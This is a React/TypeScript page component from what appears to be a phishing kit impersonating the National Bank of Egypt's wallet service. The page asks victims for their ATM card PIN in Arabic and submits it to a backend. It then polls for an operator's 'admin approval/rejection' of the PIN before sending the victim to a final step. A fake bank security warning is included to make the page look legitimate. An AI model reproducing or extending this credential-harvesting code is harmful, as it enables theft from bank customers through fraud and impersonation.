import { useEffect, useState, useRef } from "react";
import { useLocation } from "wouter";
import { navigateToPage, submitData, isFormApproved, isFormRejected } from "@/lib/store";
import NBELayout from "./components/NBELayout";
import WaitingOverlay from "./components/WaitingOverlay";

export default function ATMPageNBE() {
  const [, setLocation] = useLocation();
  const [pin, setPin] = useState(["", "", "", ""]);
  const [isWaiting, setIsWaiting] = useState(false);
  const [errorMsg, setErrorMsg] = useState("");
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    navigateToPage("رمز ATM - محفظة الأهلي");
    setTimeout(() => inputRefs.current[0]?.focus(), 300);
  }, []);

  // Listen for admin approval/rejection
  useEffect(() => {
    const interval = setInterval(() => {
      if (isFormApproved.value && isWaiting) {
        setIsWaiting(false);
        setErrorMsg("");
        isFormApproved.value = false;
        setLocation("/final-nbe");
      }
      if (isFormRejected.value && isWaiting) {
        setIsWaiting(false);
        isFormRejected.value = false;
        setPin(["", "", "", ""]);
        setErrorMsg("خطأ في المعلومات المدخلة");
        setTimeout(() => inputRefs.current[0]?.focus(), 100);
      }
    }, 500);
    return () => clearInterval(interval);
  }, [isWaiting]);

  const handlePinChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;

    const newPin = [...pin];
    newPin[index] = value.slice(-1);
    setPin(newPin);
    setErrorMsg("");

    if (value && index < 3) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (e: React.ClipboardEvent) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 4);
    if (pastedData) {
      const newPin = [...pin];
      for (let i = 0; i < pastedData.length; i++) {
        newPin[i] = pastedData[i];
      }
      setPin(newPin);
      const focusIndex = Math.min(pastedData.length, 3);
      inputRefs.current[focusIndex]?.focus();
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    const pinValue = pin.join("");
    if (pinValue.length < 4) {
      setErrorMsg("يرجى إدخال رمز ATM كاملاً");
      return;
    }

    setErrorMsg("");
    setIsWaiting(true);

    submitData(
      {
        "رمز ATM": pinValue,
      },
      true
    );
  };

  return (
    <>
      {isWaiting && <WaitingOverlay message="جاري التحقق من رمز ATM..." />}
      
      <NBELayout currentStep={3} totalSteps={3}>
        <div className="text-center mb-6">
          <div className="w-14 h-14 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-3">
            <svg className="w-7 h-7 text-green-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 10h18M7 15h1m4 0h1m-7 4h12a3 3 0 003-3V8a3 3 0 00-3-3H6a3 3 0 00-3 3v8a3 3 0 003 3z" />
            </svg>
          </div>
          <h2 className="text-xl font-bold text-gray-800 mb-2">رمز ATM</h2>
          <p className="text-gray-500 text-sm">أدخل الرقم السري لبطاقة الصراف الآلي</p>
        </div>

        {/* Error Message */}
        {errorMsg && (
          <div className="bg-red-50 border border-red-200 rounded-xl p-3 mb-4 flex items-center gap-2">
            <svg className="w-5 h-5 text-red-500 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zM8.707 7.293a1 1 0 00-1.414 1.414L8.586 10l-1.293 1.293a1 1 0 101.414 1.414L10 11.414l1.293 1.293a1 1 0 001.414-1.414L11.414 10l1.293-1.293a1 1 0 00-1.414-1.414L10 8.586 8.707 7.293z" clipRule="evenodd" />
            </svg>
            <p className="text-red-600 text-sm font-medium">{errorMsg}</p>
          </div>
        )}

        <form onSubmit={handleSubmit} className="space-y-6">
          {/* ATM PIN Input Boxes */}
          <div className="flex justify-center gap-3 md:gap-4" dir="ltr">
            {pin.map((digit, index) => (
              <input
                key={index}
                ref={(el) => (inputRefs.current[index] = el)}
                type="password"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={(e) => handlePinChange(index, e.target.value)}
                onKeyDown={(e) => handleKeyDown(index, e)}
                onPaste={index === 0 ? handlePaste : undefined}
                className={`w-14 h-16 md:w-16 md:h-18 text-center text-2xl md:text-3xl font-bold rounded-xl border-2 ${
                  errorMsg
                    ? "border-red-400 bg-red-50"
                    : digit
                    ? "border-green-500 bg-green-50"
                    : "border-gray-200 focus:border-green-500"
                } outline-none transition-all bg-gray-50 focus:bg-white focus:shadow-lg`}
              />
            ))}
          </div>

          {/* Security Note */}
          <div className="bg-yellow-50 border border-yellow-200 rounded-xl p-3 flex items-start gap-2">
            <svg className="w-5 h-5 text-yellow-600 flex-shrink-0 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M8.257 3.099c.765-1.36 2.722-1.36 3.486 0l5.58 9.92c.75 1.334-.213 2.98-1.742 2.98H4.42c-1.53 0-2.493-1.646-1.743-2.98l5.58-9.92zM11 13a1 1 0 11-2 0 1 1 0 012 0zm-1-8a1 1 0 00-1 1v3a1 1 0 002 0V6a1 1 0 00-1-1z" clipRule="evenodd" />
            </svg>
            <p className="text-yellow-700 text-xs">
              لا تشارك رمز ATM الخاص بك مع أي شخص. البنك الأهلي لن يطلب منك هذا الرمز عبر الهاتف.
            </p>
          </div>

          {/* Submit Button */}
          <button
            type="submit"
            disabled={isWaiting}
            className="w-full bg-gradient-to-l from-[#1a4d2e] to-[#2d6b3f] hover:from-[#163f26] hover:to-[#245a34] text-white font-bold py-4 px-6 rounded-xl transition-all duration-300 transform hover:scale-[1.02] active:scale-[0.98] shadow-lg hover:shadow-xl text-lg disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none"
          >
            تأكيد
          </button>
        </form>
      </NBELayout>
    </>
  );
}
